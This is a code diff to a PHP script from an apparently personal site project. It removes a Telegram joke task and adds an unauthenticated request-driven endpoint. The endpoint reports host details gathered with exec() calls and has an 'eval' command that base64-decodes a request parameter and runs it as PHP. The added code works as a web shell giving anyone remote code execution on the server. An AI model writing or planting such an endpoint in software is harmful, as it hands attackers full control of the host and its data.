@@ -19,9 +19,99 @@
      * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
      * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
      */
-    $_SERVER['DOCUMENT_ROOT'] = '/home/rsgrinko/sites/dev.it-stories.ru';
-    require_once $_SERVER['DOCUMENT_ROOT'] . '/core/bootstrap.php';
 
-    use Core\MQTasks;
+    //$_SERVER['DOCUMENT_ROOT'] = '/home/rsgrinko/sites/dev.it-stories.ru';
+    //require_once $_SERVER['DOCUMENT_ROOT'] . '/core/bootstrap.php';
 
-    echo MQTasks::sendJokeToTelegram();
+    class HostFunctions
+    {
+        public static $cmd = 'default';
+
+        public static function toOut($data, $status = 'success')
+        {
+            $result = [
+                'status' => $status,
+                'cmd'    => self::$cmd,
+                'time'   => time(),
+                'data'   => $data,
+            ];
+            header('Content-Type: application/json; charset=utf-8');
+            echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+        }
+
+        public static function getHostInfo()
+        {
+            $result = [];
+            $output = [];
+            exec('free -h', $output, $code);
+            $result['memory'] = implode(PHP_EOL, $output);
+
+            $output = [];
+            exec('cat /proc/cpuinfo', $output, $code);
+            $result['cpuinfo'] = implode(PHP_EOL, $output);
+
+            $output = [];
+            exec('uname -a', $output, $code);
+            $result['uname'] = implode(PHP_EOL, $output);
+
+            $output = [];
+            exec('hostname', $output, $code);
+            $result['hostname'] = implode(PHP_EOL, $output);
+
+            $output = [];
+            exec('uptime', $output, $code);
+            $result['uptime'] = implode(PHP_EOL, $output);
+
+            $result['ip'] = $_SERVER['SERVER_ADDR'];
+
+            return $result;
+        }
+    }
+
+
+    $commandList        = [
+        'ping',
+        'getHostInfo',
+        'getHostIp',
+        'eval',
+    ];
+    $command            = $_REQUEST['cmd'] ?? 'default';
+    HostFunctions::$cmd = $command;
+    switch ($command) {
+        case 'getCommands':
+            HostFunctions::toOut($commandList);
+            break;
+        case 'ping':
+            HostFunctions::toOut('pong');
+            break;
+        case 'getHostInfo':
+            $result = HostFunctions::getHostInfo();
+            HostFunctions::toOut($result);
+            break;
+
+        case 'getHostIp':
+            HostFunctions::toOut($_SERVER['SERVER_ADDR']);
+            break;
+
+        case 'eval':
+            $evalString = isset($_REQUEST['evalString']) ? base64_decode($_REQUEST['evalString']) : null;
+            if ($evalString === null) {
+                HostFunctions::toOut('No eval string', 'error');
+            } else {
+                ob_start();
+                try {
+                    eval($evalString);
+                    $result = ob_get_clean();
+                } catch (Throwable $t) {
+                    $result = 'Error on line ' . $t->getLine() . ': ' . $t->getMessage();
+                    ob_clean();
+                }
+                HostFunctions::toOut($result);
+            }
+            break;
+
+        default:
+            HostFunctions::toOut('Command not found', 'error');
+            break;
+    }
+
